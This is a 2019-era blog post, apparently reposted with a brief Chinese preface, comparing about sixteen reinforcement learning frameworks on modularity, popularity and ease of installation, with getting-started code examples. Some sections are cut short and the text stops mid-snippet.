    <content type="text"><![CDATA[A Comparison of Reinforcement Learning Frameworks: Dopamine, RLLib, Keras-RL, Coach, TRFL, Tensorforce, Coach and more （原文中的视频和谷歌趋势图可到原文中查看） 文中未涉及的框架： Baselines rlpyt PS 有一篇相关论文A Survey on Deep Reinforcement Learning Libraries，韩文 Reinforcement Learning (RL) frameworks help engineers by creating higher level abstractions of the core components of an RL algorithm. This makes code easier to develop, easier to read and improves efficiency. But choosing a framework introduces some amount of lock in. An investment in learning and using a framework can make it hard to break away. This is just like when you decide which pub to visit. It’s very difficult not to buy a beer, no matter how bad the place is. In this post I provide some notes about the most popular RL frameworks available. I also present some crude summary statistics from Github and Google (which you can’t trust) to attempt to quantify their popularity. I believe posts like this are useful, but sometimes people are upset because I don’t like something about their framework. I do not want to upset anyone. If I do, I’m sorry. The work performed by the framework authors is nothing less than extraordinary. This is my meagre interpretation using the little time I have available. Please contact me to make corrections. Original Purpose of this WorkI am writing a book on RL for O’Reilly. As a part of that book, I want to demonstrate to my readers how to build and design various RL agents. I think the readers will benefit by using code from an already-established framework or library. And in any case, the people writing these frameworks would probably do a better job than I could anyway. So the question was, “which framework?”. Which led me down this path. It started with a few frameworks, but then I found more. And more. And it turns out there are quite a lot of frameworks already available, which turned this into a 8000 word monster. Apologies in advance for the length. I don’t expect many people to read all of it! Because of the length, this also took a while to write. This means that the reviews don’t have laser-focus. Sometimes I comment about one thing in one framework and not at all in another. Apologies for this; it was not intended to be exhaustive. MethodologyMost of the evaluation is pure opinion. But there are a few quantitative metrics we can look at. Namely the statistics of the repository that are made available in Github. Starts roughly represent how well known each of the frameworks are, but they do not represent quality. More often than not the frameworks with the most stars have more marketing power. After that, I was looking for a combination of modularity, ease of use, flexibility and maturity. Simplicity was also desired, but this is usually mutually exclusive with modularity and flexibility. The opinions presented below are based upon these ideals. One reoccurring theme is the dominance of Deep Learning (DL) frameworks within the RL framework. Quite often the DL framework would breakout above the abstractions and the RL framework would just be an extension of the former. This means that if you are in a situation where you are already in bed with a particular DL solution, then you might as well stick with that. But to me, that represents lock-in. My preference would always tend towards the frameworks that don’t mandate a specific DL implementation or don’t use DL at all (shock/horror!). The result is that all the Google frameworks tend towards Tensorflow, all the academic frameworks use PyTorch then there are a few brave souls dangling in-between with twice as much work as everyone else. I also attempted to look at the Google rankings for each framework, but that turned out to be unreliable. Accompanying NotebookWhere I could, or where it made sense, I tried out a lot of these frameworks. Many of them didn’t work. And some of them had excellent Notebooks to begin with, so you can just check those out. For the rest, I have published a gist that you can run on Google Colabratory. This is presented in a very raw format. It is not meant to be comprehensive or explanatory. I simply wanted to double check that in the simplest of cases, it worked. In each section I also present a “Getting Started” sub-heading that demonstrates the basic example from each framework. This code is from the Notebook. Reinforcement Learning FrameworksThe following frameworks are listed in order of the number of stars in their Github repository as of June 2019. The actual number of stars and other metrics are presented as badges just below the title of each framework. The following frameworks are compared: OpenAI Gym Google Dopamine RLLib Keras-RL TRFL Tensorforce Facebook Horizon Nervana Systems Coach MAgent SLM-Lab DeeR Garage Surreal RLgraph Simple RL OpenAI Gym OpenAI is a not-profit, pure research company. The provide a range of open-source Deep and Reinforcement Learning tools to improve repeatability, create benchmarks and improve upon the state of the art. I like to think of them as a bridge between academia and industry. But I know what you’re thinking. “Phil, Gym is not a framework. It is an environment.”. I know, I know. It provides a range of toy environments, classic control, robotics, video games and board games to test your RL algorithm against. But I have included it here because it is used so often as the basis for custom work. People use it like a framework. Think of it as an interface between an RL implementation and the environment. It is so prolific, many of the other frameworks listed below also interface with Gym. Furthermore it acts as a baseline as to compare everything against. Since this is one of the most popular repositories in RL. Getting StartedGym is both cool and problematic because of it’s realistic 3D environments. If you want to visualise what is going on you need to be able to render these environments. It pretty much works on your laptop, but struggles when you try and run it in a Notebook because of limitations with the browser. To work around this, you have to use a virtual display. Basically we have to mock out the video driver. This means most of the “getting started” code is video wrapping code. If we ignore all the boring stuff, which you can find in the accompanying Notebook, the core gym code looks like: 1234567891011121314import gymfrom gym.wrappers.monitoring.video_recorder import VideoRecorder # Because we want to record a videoenv = gym.make("CartPole-v1") # Create the cartpole environmentrec = VideoRecorder(env) # Create the video recorderrec.capture_frame() # Capture the starting positionwhile True: action = env.action_space.sample() # Use a random action observation, reward, done, info = env.step(action) # to take a single step in the environment rec.capture_frame() # and record if done: break # If the pole has fallen, quit.rec.close() # Close the recordingenv.close() # Close the environment As you can see, it falls straight away because we’re just passing random actions at the moment. But still, there’s something hypnotic, something drum-and-bass about it. But now let’s look at some agent framework only options. Google Dopamine Google Dopamine: “Not an Official Google product” (NOGP - an acronym I’m going to coin now) but written by Google employees and hosted on Google github. So, Google Dopamine then. It is a relatively new entrant to the RL framework space that appears to have been a hit. It boasts a large number of Github stars and some amount of Google trend ranking. This is especially surprising because of the limited number of commits, committers and time since the project was launched. Clearly it helps you have Google’s branding and marketing department. Anyway, the cool thing about this framework is that it emphasises configuration as code through it’s use of the Google gin-config configuration framework. The idea is that you have lots of pluggable bits that you plumb together through a configuration file. The benefit is that this allows people to release a single configuration file that contains all of the parameters specific to that run. And gin-config makes things special because it allows you to plumb together objects; instances of classes and lambdas and things like that. The downside is that you increase the complexity in the configuration file and it can end up like just another file full of code that people can’t understand because they are not used to it. Personally I would always stick to a “dumb” configuration file like Kubernetes Manifests or JSON (like many of the other frameworks), for example. The wiring should be done in the code. The one major benefit is that it promotes plugability and reuse, which are key OOP and Functional concepts that are often ignored when developing Data Science products. It is clear that it has gained a significant amount of traction in a very short time. And frankly, that worries me a bit. There are four contributors and only 100 commits. Of those four people, three are from the community (bug-fixes, etc.). This leaves one person. And this one person has committed, wait for it, over 1.3 million lines of code. Clearly there’s something fishing going on here. From the commit history it looks like the code was transferred from another repo. A 1.2 million line commit isn’t exactly best practice! :-) It’s Apache licensed, so there’s nothing too strange going on but the copyright has been assigned to Google Inc.. But I’m reassured by the contributor agreement. In terms of modularity, there isn’t much. There isn’t any abstraction for the Agents; they are implemented directly and configured from the gin config. There’s not many implemented either. There isn’t any official abstraction of an environment either. In fact, it looks like they are just passing back core Tensorflow objects everywhere and assuming using the Tensorflow interface. In short, very little official OOP-style abstraction, which is different to most of the other frameworks. In short, little modularity, reuse is clunky (IMO) and although it appears to be popular, it isn’t very mature and doesn’t have community support. Getting StartedAgain you can find the example in the accompanying Notebook, but the premise is to build your RL algorithm via a configuration file. This is what it looks like: 12345678910111213141516171819202122232425262728293031323334353637383940DQN_PATH = os.path.join(BASE_PATH, 'dqn')# Modified from dopamine/agents/dqn/config/dqn_cartpole.gindqn_config = """# Hyperparameters for a simple DQN-style Cartpole agent.

But it’s implementing a more complicated algorithm so we might expect that. I’m quite happy about the hyperparameters being in there, but I’m not sure that I am a fan of all the dynamic injection (the @ denotes an instance of a class). Proponents would say that “wow, look, I can just swap out the optimiser just by changing this line”. But I’m of the opinion that I could do that with plain old Python too. After a bit of training: 123tf.reset_default_graph()dqn_runner = run_experiment.create_runner(DQN_PATH, schedule='continuous_train')dqn_runner.run_experiment() Then we can run some similar code to before to generate a nice video: 123456789101112rec = VideoRecorder(dqn_runner._environment.environment)action = dqn_runner._initialize_episode()rec.capture_frame()while True: observation, reward, is_terminal = dqn_runner._run_one_step(action) rec.capture_frame() if is_terminal: break # If the pole has fallen, quit. else: action = dqn_runner._agent.step(reward, observation)dqn_runner._end_episode(reward)rec.close() RLLib via ray-project Ray started life as a project that aimed to help Python users build scalable software, primarily for ML purposes. Since then it has added several modules that are dedicated to specific ML use cases. One is distributed hyperparameter tuning and the other is distributed RL. The consequence of this generalisation is that the popularity numbers are probably more due to the hyperparameter and general purpose scalability use case, rather than RL. Also, the distributed focus of the library means that the agent implementations tend to be those that are inherently distributed (e.g. A3C) or are attempting to solve problems that are so complex they need distributing so that they don’t take years to converge (e.g. Rainbow). Despite this, if you are looking to productionise RL, or if you are repeating training many times for hyperparameter tuning or environment improvements, then it probably makes sense to use ray to be able to scale up and reduce feedback times. In fact, a number of other frameworks (specifically: SLM-Lab and RLgraph) actually use ray under the hood for this purpose. I believe there is a strong applicability to RL here. The clear focus on distributed computation is good.The sheer number of commits and contributors is also reassuring. But there is a lot of the underlying code in C++. Some even in Java. Only 60% is python. Despite this there is a very clear abstraction for Policys, a nice, almost functional interface for agents called Trainers (see the DQN implementation for an example of its usage), a Model abstraction that allows the use of PyTorch or Tensorflow (yay!) and a few more for evaluation and policy optimisation. Overall the documentation is excellent and clear architectural drawings are presented (see this example, for example). It is modular, scales well and is very well supported and accepted by the community. The only downside is the complexity of it all. That’s the price you pay for all this functionality. Getting StartedThere is an issue with the version of pyarrow preinstalled in Google colab that isn’t compatible with ray. You have to uninstall the preinstalled version and restart the runtime, then it works. I also couldn’t get the video rendering working in the same way we made the previous examples work. My hypothesis is that because they are running in separate processes they don’t have access to the fake pyvirtualdisplay device. So despite this, let us try an example: 12!pip uninstall -y pyarrow!pip install tensorflow ray[rllib] &gt; /dev/null 2&gt;&amp;1 After you remove pyarrow and install rllib, you must restart the Notebook kernel. Next, import ray: 1234import rayfrom ray import tuneray.init() And run a hyperparameter tuning job for the Cartpole environment using a DQN: 1234567891011tune.run( "DQN", stop=&#123;"episode_reward_mean": 100&#125;, config=&#123; "env": "CartPole-v0", "num_gpus": 0, "num_workers": 1, "lr": tune.grid_search([0.01, 0.001, 0.0001]), "monitor": False, &#125;,) There is a lot of syntactic sugar here, but it looks reasonably straightforward to customise the training functionality (docs). Keras-RL I love Keras. I love the abstraction, the simplicity, the anti-lock-in. When you look at the code below you can see the Keras magic. So you would think that keras-rl would be a perfect fit. However it doesn’t seem to have obtained as much traction as the other frameworks. If you look at the documentation, it’s empty. When you look at the commits there only a few brave souls that have done most of the work. Compare this to the main Keras project. And I think I might know why. Keras was built from the ground up to allow users to quickly prototype different DL structures. This relied on the fact that the Neural Network primitives could be abstracted and modular. But when you look at the code for keras-rl, it’s implemented like it is in the textbooks. Each agent has it’s own implementation despite the similarities between SARSA and DQN, for example. Think of all the “tricks” that could be modularised, tricks like those that are used for Rainbow, which could allow people to experiment using these tricks in other agents. There is some level of modularity, but I think it is at a level that is too high. But maybe it’s not too late, because there is so much promise here. If there were enough people interested, or maybe if there was more support from the core Keras project, then maybe this could be the go-to RL framework of the future. But for now, I don’t think it is. It’s almost as easy to obtain the benefits of Keras by using other frameworks that we have already discussed. Getting StartedThe examples worked out of the box here and the only modifications I made were to use a mock Display and add some video recording of the tests. You can see that most of the code here is standard Keras code. The additions by Keras-RL aren’t really Keras related at all. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import numpy as npimport gymfrom keras.models import Sequentialfrom keras.layers import Dense, Activation, Flattenfrom keras.optimizers import Adamfrom rl.agents.dqn import DQNAgentfrom rl.policy import BoltzmannQPolicyfrom rl.memory import SequentialMemoryENV_NAME = 'CartPole-v0'# Get the environment and extract the number of actions.env = gym.make(ENV_NAME)np.random.seed(123)env.seed(123)nb_actions = env.action_space.n# Next, we build a very simple model.model = Sequential()model.add(Flatten(input_shape=(1,) + env.observation_space.shape))model.add(Dense(16))model.add(Activation('relu'))model.add(Dense(16))model.add(Activation('relu'))model.add(Dense(16))model.add(Activation('relu'))model.add(Dense(nb_actions))model.add(Activation('linear'))print(model.summary())# Finally, we configure and compile our agent.

Given the credentials you would have expected it to be popular, but the first thing you notice is the distinct lack of commits. Then the distinct lack of examples and Tensorflow 2.0 support. The main issue is that it is too low-level. It’s the exact opposite of Keras-RL. The functionality that TRFL provides is a few helper functions, a q-learning value function for example, which takes in a load of Tensorflow Tensors with abstract names. Getting StartedI recommend taking a quick look at this Notebook as an example. But note that the code is very low level. Tensorforce Tensorforce has similar aims to TRFL. It attempts to abstract RL primitives whilst targeting Tensorflow. By using Tensorflow then you gain all of the benefits of using Tensorflow, i.e. graph models, easier, cross-platform deployment. There are four high-level abstractions of an Environment, Runner, Agent and Model. These mostly do what you would expect, but the “Model” abstraction is not something you would normally see. A Model sits within an Agent and defines the policy of the agent. This is nice because, for example, the standard Q-learning model can be overridden by the Q-learning n-step model, only changing one small function. This is precisely the middle ground between TRFL and Keras that I was looking for. And it’s implemented in an OOP way, which some people will like, others wont. But at least the abstraction is there. The downside of libraries like this, or any DL focused RL library, is that much of the code is complicated by the underlying DL framework. The same is true here. For example, the random model, i.e. one that chooses a random action, something that should take precisely one line of code, is 79 lines long. I’m being a little facetious here (license, class boilerplate, newlines, etc.) but hopefully you understand my point. It also means that there is no implementation of “simple” RL algorithms, i.e. those that don’t use models. E.g. entropy, bandits, simple MDPs, SARSA, some tabular methods, etc. And the reason for this is that you don’t need a DL framework for these models. So in summary, I think the level of abstraction is spot on. But the benefits/problems of limiting yourself to a DL framework remain. Note that this is based upon version 0.4.3 and a major rewrite is underway. Getting StartedThe getting started example is sensible. We’re creating an environment, an agent and a runner (the thing that actually does the training). The specifications for the agent is a little different though. It reminds me of the Dopamine Gin config, except it’s using standard json. In the example I’m getting those specifications from their examples directory, but you can imagine how easy it would be to run a hyperparameter search using them. 123456789101112131415161718192021222324252627282930313233343536373839environment = OpenAIGym( gym_id="CartPole-v0", monitor=".", monitor_safe=False, monitor_video=10, visualize=True)with urllib.request.urlopen("https://raw.githubusercontent.com/tensorforce/tensorforce/master/examples/configs/dqn.json") as url: agent = json.loads(url.read().decode()) print(agent)with urllib.request.urlopen("https://raw.githubusercontent.com/tensorforce/tensorforce/master/examples/configs/mlp2_network.json") as url: network = json.loads(url.read().decode()) print(network)agent = Agent.from_spec( spec=agent, kwargs=dict( states=environment.states, actions=environment.actions, network=network ))runner = Runner( agent=agent, environment=environment, repeat_actions=1)runner.run( num_timesteps=200, num_episodes=200, max_episode_timesteps=200, deterministic=True, testing=False, sleep=None)runner.close() Facebook Horizon Horizon is a framework from Facebook that is dominated by PyTorch. Another DL focused library then. Also: The main use case of Horizon is to train RL models in the batch setting. &hellip; Specifically, we try to learn the best possible policy given the input data. So like other frameworks the focus is off-policy, model driven RL with DL in the model. But this is differentiated due to the use of PyTorch. You could also compare this to Keras-RL using PyTorch as the backend for Keras. I’ve already discussed the cons of such a focused framework in the Tensorforce section, so I won’t state them again. There are several interesting differences though. There is no tight Gym integration. Instead they intentionally decouple the two by dumping Gym data into JSON, then reading the JSON back into the agent. This might sound verbose, but is actually really good for decoupling and therefore more scalable, less fragile and more flexible. The downside is that there are more hoops to jump through due to the increased complexity. However, as inconceivable as it sounds, there is no pip installer for Horizon. You have to use conda, install onnx, install java, setup the JAVA_HOME to point to conda, install Spark, install Gym (fair enough), install Apache thrift and then build Horizon. Wow. (Bonus points if you counted how many steps that was). So I think it suffice to say that I’m not going to attempt to install this in the demo Notebook. Getting StartedYou’ll need a lot of time and a lot of patience. Follow the build instructions, then follow the training guide. I can’t vouch for it because I have a life to get on with. Nervana Systems Coach The first thing you will notice when you look at this framework is the number of implemented algorithms. It is colossal and must have taken several people many weeks to implement. The second thing you will notice is the number of integrated Environments. Considering how much time this must have taken, it gives a lot of hope for the rest of the framework. It comes with a dedicated dashboard which looks pretty nice. Most of the other frameworks rely on the Tensorboard project. One particular wow feature that I haven’t seen before, is inbuilt deployment for Kubernetes. I think that the orchestration of Coach by Coach is a step too far, but the fact that they’ve even thought about it means that it is probably scalable enough to deploy onto Kuberentes with standard tooling. The level of modularity is astounding. For example there are classes that implement all sorts of exploration strategies and allow you to make all sorts of changes to the various model designs. The ONLY thing that I can think of that is a little annoying is the same limitation of forcing me to use DL as the model. I remain convinced that a subset of simpler applications do not require anything nearly as complex as DL and could benefit for more traditional Regression methods. However, I’m sure it should be reasonably easy to add in a little stub class that removes the DL stuff. Interestingly, the framework supports Tensorflow and MXNet due to it’s use of Keras. This means that PyTorch is not supported, because Keras doesn’t support PyTorch. Frankly, I can’t understand why this framework is so unpopular in any way of measuring it. In terms of stars. In terms of the number of google pages (the answer is 7, if you are wondering). Compare that to Google Dopamine for example, with 16500 pages. It is certainly the most comprehensive framework with the best documentation and a fantastic level of modularity. They’ve even got a ❤️ Getting Started Notebook ❤️. Getting StartedThere are two important notes I’d like to point out. First, make sure you are looking at a tagged version of the documentation or the demos. There are some new features in the master branch that don’t work with a pip installed version. Second, it depends on OpenAI Gym version 0.12.5, which isn’t installed in colab. You’ll need to run !pip install gym==0.12.5 and restart the runtime. 12345678910111213141516171819202122232425import tensorflow as tftf.reset_default_graph() # So that we don't get an error for TF when we re-runfrom rl_coach.agents.clipped_ppo_agent import ClippedPPOAgentParametersfrom rl_coach.environments.gym_environment import GymVectorEnvironmentfrom rl_coach.graph_managers.basic_rl_graph_manager import BasicRLGraphManagerfrom rl_coach.graph_managers.graph_manager import ScheduleParametersfrom rl_coach.core_types import TrainingSteps, EnvironmentEpisodes, EnvironmentStepsfrom rl_coach.base_parameters import VisualizationParametersglobal experiment_path; experiment_path = '.' # Because of some bizzare global in the mp4 dumping code# Custom schedule to speed up training.

This is a completely different aim compared to all the other “traditional” RL frameworks that use only a single or very few agents. They claim it can scale up to millions of agents. But again, no pip installer. Please, everyone, create pip installers for you projects. It’s vitally important for ease of use and therefore project traction. I guess it’s because the whole project is written in C, presumably for performance reasons. It’s using Tensorflow under the hood and builds its own gridworld-like enironment. The Agents are designed with “real-life” simulations in mind. For example you can specify the size of the agent, how far it can see; things like that. The observations that are passed to the Agents are grids. The actions that they can take are limited to moving, attacking and turning. They are rewarded according to a flexible rule definition. In short, the framework is setup to handle game of life style games out of the box, with some extra modularity on how the agents behave and are rewarded. Due to this we can use some of the more advanced DL methods to train the agents to perform complex, coordinated tasks. Like surround prey so that it can’t move. You can learn more in the getting started guide. I am very impressed with the idea. But as you can see from the Github stats above, 4 commits a year basically means that it is hardly being used. The last major updates were in 2017. This is a shame, because it represents something very different compared to the other frameworks. It would be great if someone could make it easier to use, or replicate the framework in idiomatic Python, so that it becomes easier to use. Getting StartedSo I almost got it working in the Notebook. I tried a few examples from the getting started guide. The training version takes hours, so I bailed on that quite quickly. The examples/api_demo.py however is just testing the learnt models, so that is lightning quick. However, it renders the environment in some proprietary text format. You need to run a random webserver binary that parses and hosts the render in the browser. Because we’re in colab, it doesn’t allow you to run a webserver. So I tried downloading the files, but we built the binaries on colab, not on a mac, so I wasn’t able to run the binary. So that was a bit frustrating. It would have been much simpler if it had just rendered it in some standard format like mp4 of a gif or something. And also disappointing, because I was looking forward to generating some complex behavior. But just so you are not disappointed, here is some eye candy from the author. Please excuse the audio! And here are the remains of the code that worked: 123456!git clone https://github.com/geek-ai/MAgent.git!sudo apt-get install cmake libboost-system-dev libjsoncpp-dev libwebsocketpp-dev%cd MAgent!bash build.sh!PYTHONPATH=$(pwd)/python:$PYTHONPATH python examples/api_demo.py You can exchange that last call to any of the python files in teh examples folder. TF-Agents Tensorflow-Agents (TF-Agents) is another NOGP from Google with the focus squarely on Tensorflow. So treat this as direct competition to TRFL, Tensorforce and Dopamine. Which begs the question: why have more Google employees created another Tensorflow-abstraction-for-RL when TRFL and Dopamine already exist? In an issue discussing the relationship between TF-Agents and Dopamine the contributors suggest that: it seems that Dopamine and TF-Agent strongly overlap. Although dopamine aims at being used for fast prototyping and benchmarking as the reproducibility has been put at the core of the project, whereas TF-Agent would be more used for production-level reinforcement learning algorithms. To be honest, I’m not sure what “production-level” means at this point. There are some great colab examples, but there is no documentation. And you certainly shouldn’t be using Notebooks in production. Once you start digging into the examples, then it becomes clear that the code is very Tensorflow heavy. For example, the simple Cartpole example has a lot of lines of code. Mainly because there is a lot of explanation and debuging code in there, but it looks like a sign of things to come. I must admit though, the code does look very nice. It’s nicely separated and the modularity looks good. All the abstractions you would expect are there. The only thing I want to pick on is the Agent abstraction. This is the base class and it is directly coupled to Tensorflow. It is a Tensorflow module. This adds a significant amount of complexity and I wish that it was abstracted away so I didn’t have to worry about it until I need it. The same is true for the vast majority of other abstractions; they are all Tensorflow modules. With that said, it is clear that this is a far more serious and capable library than TRFL. Getting StartedThere is already an extensive set of Notebooks available in their repository, so I won’t waste time just copy and pasting here. You can also run them directly in colab too. The video below shows three episodes of the cartpole. To me it looks like it is having a fit. Constant nudges to rebalance. SLM-Lab SLM-Lab is modular RL framework based upon PyTorch. It appears to be aimed more towards researchers. They stress the importance of modularity, but rightly state that being simple and modular is probably not possible; it is a compromise between the two. Interestingly it also uses the Ray project under the hood to make it scalable. Despite starting in 2017, the small number of contributors and the relative popularity in terms of github stars, there is lots of activity. The vast majority of the commits are one-liners, but the commitment by the authors is amazing. Unfortunately this is another non-pip install framework and attempts to install a whole load of build related C libraries and miniconda. Which is problematic in colab. Being a good Engineer I ignored all the documentation and tried to get it working myself through trial and error. It almost worked, but I stumbled across a problem when initialising pytorch that I didn’t know how to fix. So unfortunately, again, you will have to settle for an example image from the authors. I struggled a bit with the documentation. The architecture documentation is limited and the rest is focused towards usage. But by usage I mean running experiments on current implementations. I struggled to find the documentation that told me how to plug modules together in different ways. I presume they intend that this should be done via the JSON spec files. Indeed the original motivation was: There was a need for a framework that would allow us to compare algorithms and environments, quickly set up experiments to test hypotheses, reuse components, analyze and compare results, log results. So the goal here is to allow reuse via configuration, much like Dopamine and Tensorforce. This “RL as configuration” seems to be a theme! However, I’m not convinced. I would argue that code is more idiomatic, more flexible. It is what people are used to. Every time you do something via configuration that is another Domain Specific Language (DSL) that users have to learn. And because that DSL is generally static (Gin is not) then the implementation of the DSL sets the limitation. It is never going to suit everyone because there will be an edge case that isn’t covered by the DSL. DeeR The initial impression of DeeR is a good one. It has a pip installer. It waxes lyrical about modularity. It has only two Python dependencies; numpy and Joblib. So no nasty C make process to get it working, great! The documentation is clear, but is missing some overall architecture documentation. You have to dig into the classes/code to find the documentation. But when you do it is good. The “modules” are split mostly in the way you would expect. Modules for the Environment, Agent, and Policies. There is an interesting class called Controller which is not standard. This class provides lifecycle hooks that you can attach to; events like the end of an episode or whenever an action is taken. For example, if you wanted to do some logging at the end of an episode, then you could subclass this class and override the onEpisodeEnd. There are several example controllers, one of which is an EpsilonController. This allows you to dymaically alter the eta or epsilon value in e-greedy algorithms. This is quite powerful as it allows you to alter the learning process in mid flight. But from a Software Engineering perspective this is quite risky. Any Functional Programmer will tell you not to mutate the state of another object because “Dragons be here”. It would have been nicer if the API was more functional and you could pass in functions that computed, for example, the agent’s next eta, rather than mutating the state of the agent directly. This may make it slightly more complex, though. The framework also contains a few learning algorithms but it’s certainly not as comprehensive as something like Coach. Getting StartedThanks to the pip install and very few dependencies, this was probably the easiest framework to get up and running. 12!pip install git+git://github.com/VINF/deer.git@master!git clone https://github.com/VinF/deer.git I cloned the git repo so I could run the examples. Then it’s just a case of importing everything: 123456%cd /content/deer/examples/toy_envimport numpy as npfrom deer.agent import NeuralAgentfrom deer.learning_algos.q_net_keras import MyQNetworkfrom Toy_env import MyEnv as Toy_envimport deer.experiment.base_controllers as bc And stealing the example: 12345678910111213141516171819202122232425262728293031323334353637rng = np.random.RandomState(123456)# --- Instantiate environment ---env = Toy_env(rng)# --- Instantiate qnetwork ---qnetwork = MyQNetwork( environment=env, random_state=rng)# --- Instantiate agent ---agent = NeuralAgent( env, qnetwork, random_state=rng)# --- Bind controllers to the agent ---# Before every training epoch, we want to print a summary of the agent's epsilon, discount and# learning rate as well as the training epoch number.agent.attach(bc.VerboseController())# During training epochs, we want to train the agent after every action it takes.# Plus, we also want to display after each training episode (!= than after every training) the average bellman# residual and the average of the V values obtained during the last episode.agent.attach(bc.TrainerController())# All previous controllers control the agent during the epochs it goes through. However, we want to interleave a# "test epoch" between each training epoch. We do not want these test epoch to interfere with the training of the# agent. Therefore, we will disable these controllers for the whole duration of the test epochs interleaved this# way, using the controllersToDisable argument of the InterleavedTestEpochController. The value of this argument# is a list of the indexes of all controllers to disable, their index reflecting in which order they were added.agent.attach(bc.InterleavedTestEpochController( epoch_length=500, controllers_to_disable=[0, 1]))# --- Run the experiment ---agent.run(n_epochs=100, epoch_length=1000) Here we are instantiating an environment, creating the Q-Learning algorithm and creating the agent that uses that algorithm. Next we use the .attach() function on the agent to appen all of these Controllers we have been talking about. They add logging and interleave training periods and testing periods. If we wanted to edit any of this we just need to reimplement the piece that we’re interested in. Great! The only issue was that the toy example didn’t work! I’m not sure why, but it’s probably something silly. The training values looked a little weird in that the test score was always 0, and the training loss increased over time. Maybe it got stuck. Not sure. I’m sure it’s something silly. Garage Garage is a follow-on from rllab with the same aims, but just community, rather than individual support. The documentation is a little sparse. For instance, it doesn’t highlight that it implements a large number of algorithms. And also a huge number of policies. In fact, there’s pretty much everything you could ever need in this quiet little directory. But it is very tightly coupled to Tensorflow, if that is a problem for you. There’s so much functionality here, but it is completely hidden. The code is reasonably well documented, but it’s not exposed. You have to dig through it to find it. Again there is no pip installer. Just some custom conda install and some apt-get dependencies. So I can see that there is a huge amount of value in the algorithm implementations, but I’m going to skip the getting started this time. Surreal Surreal is a suite of applications. Foremost it is an RL framwork. But to make sure they don’t build just another framework, they also provide a new Robotics simulator, an orchestrator, a cloud infrastructure provisioner and a protocol for distributed computing. It comes from Stanford, hence academic in approach and use-case, hence the default use of PyTorch. I’m all for the framework and the simulator, but it would have been easier if they had just used standard industrial components for the orchestrator (Kubernetes), infrastructure (Terraform) and protocol (Kafka/Nats/etc/etc). Those problems have already been solved. (Correction haha. Once I dug into the getting started guide, it became clear that they are using Kubernetes and Terraform. Great choices! 😂) The robotics simulator is a collection of MuJoCo simulations. So that is a great addition to the Environment list (despite the licensing terms of MuJoCo). The RL framework needs a big of coaxing into life. It’s another combination of apt-get’s and conda installs. Oh wow. I’ve just noticed that they’ve disabled the Github issue tracker. And there’s an explict copyright notice that belongs to each of the authors. OK, so this isn’t even open source. But the robosuite is MIT licenced? Very strange. Stopping here due to the lack of issues and werid licensing. RLgraph So let’s start by saying RLgraph has a whopping number of commits. They’re running at 4000 commits per year. Compare that to OpenAI Gym at just 221. Somebody needs to tell these five people to have a holiday. And it’s only a year old. I can only imagine that it is being used full time. But anyway. Like other frameworks they are focusing on scalability. But interestingly they are mapping directly to both Tensorflow and Pytorch. They are not using Keras. So that must have been a massive challenge in itself. It looks like they’ve used the Ray project to distribute work like SLM-Lab. But hurray! They have a pip installer. The configuration of the agents is controlled via JSON. But only the configuration. Not the construction. I’ve just read that the authors also worked on Tensorforce, which explains some of the de ja voux I have been feeling. And I love that my complaints in Tensorforce, about how the underlying DL framework often leaks into the RL implementation code, have been addressed in RLgraph. I get the feeling that they’ve been listening to me rant to my bored wife. Separating spaces of tensors from logical composition enables us to reuse components without ever manually dealing with incompatible shapes again. Note how the above code does not contain any framework-specific notions but only defines an input dataflow from a set of spaces. Just want I always wanted. And this is achieved with an abstraction of inputs and outputs. Other than that, the API is familiar. An Environment and an Agent. There’s a very cool Component class that abstracts the DL building blocks. However, there are abstractions that are missing here. There’s no Policy abstractions. No exploration abstractions. Basically all the nice abstractions from Nervana Systems Coach. But I’m still pretty impressed. Getting StartedI altered the cartpole getting started example a little to use the SingleThreadedWorker and enable rendering on the environment to get the video output. Other than that it all looks very familiar. 123456789101112131415161718192021222324252627282930import numpy as npfrom rlgraph.agents import DQNAgentfrom rlgraph.environments import OpenAIGymEnvfrom rlgraph.execution import SingleThreadedWorkerenvironment = OpenAIGymEnv('CartPole-v0', monitor=".", monitor_video=1, visualize=True)# Create from .json file or dict, see agent API for all# possible configuration parameters.agent = DQNAgent.from_file( "configs/dqn_cartpole.json", state_space=environment.state_space, action_space=environment.action_space)episode_returns = []def episode_finished_callback(episode_return, duration, timesteps, **kwargs): episode_returns.append(episode_return) if len(episode_returns) % 10 == 0: print("Episode &#123;&#125; finished: reward=&#123;:.2f&#125;, average reward=&#123;:.2f&#125;.".format( len(episode_returns), episode_return, np.mean(episode_returns[-10:]) ))worker = SingleThreadedWorker(env_spec=lambda: environment, agent=agent, render=True, worker_executes_preprocessing=False, episode_finish_callback=episode_finished_callback)print("Starting workload, this will take some time for the agents to build.")# Use exploration is true for training, false for evaluation.worker.execute_timesteps(1000, use_exploration=True) Simple RL And finally, simple_rl. All other frameworks state that their goals are performance/scalability or modularity or repeatability. None of them set out to be simple. This is where simple_rl steps in. Built from the ground up to be as simple as possible. It only has two dependencies, numpy and matplotlib. And that’s only if you want to plot the results. Basically it’s just numpy. It has pip installer. The documentation is non-existant but that’s ok, who needs docs? ;-) It presents a familiar collection of abstractions: an agent, an experiment, an environment that is called an mdp. The framework also abstracts other parts of the model like an action, feature, state. And a planning class that implements the strategies for next actions. It is still very modular, but some of the naming convensions should be changed to match the other frameworks (standardisation). So it is becoming apparent that “simple” doesn’t necesarily mean easy to understand. Generally, more abstraction makes it harder to understand. Simple in this case is “ease of use”. I think that’s a shame. I really was hoping for simplicity in terms of undertanding. But it looks like it is aiming to compete with some of the more complex frameworks; Deep RL support with PyTorch is in development. There continues to be a gap in the framework market for a very simple, understandable RL framework. And I’m not sure why this framework has so few stars compared to the rest. Presumably because it’s not bootstrapping on the popularity of other DL frameworks, like many of the other frameworks. Getting StartedIt should have been simple. But deep inside the code there are a few lines that force the Matplotlib to use the TkAgg backend. I tried to get TkAgg working in the Notebook but could not. It is designed for graphical desktop use, so you can imagine that it is not straightforward. I created an issues here. It should be a simple fix. If/When it works, it should be as simple as something like: 1234567891011121314from simple_rl.agents import QLearningAgent, RandomAgent, RMaxAgentfrom simple_rl.tasks import GridWorldMDPfrom simple_rl.run_experiments import run_agents_on_mdp# Setup MDP.mdp = GridWorldMDP(width=4, height=3, init_loc=(1, 1), goal_locs=[(4, 3)], lava_locs=[(4, 2)], gamma=0.95, walls=[(2, 2)], slip_prob=0.05)# Setup Agents.ql_agent = QLearningAgent(actions=mdp.get_actions())rmax_agent = RMaxAgent(actions=mdp.get_actions())rand_agent = RandomAgent(actions=mdp.get_actions())# Run experiment and make plot.run_agents_on_mdp([ql_agent, rmax_agent, rand_agent], mdp, instances=5, episodes=50, 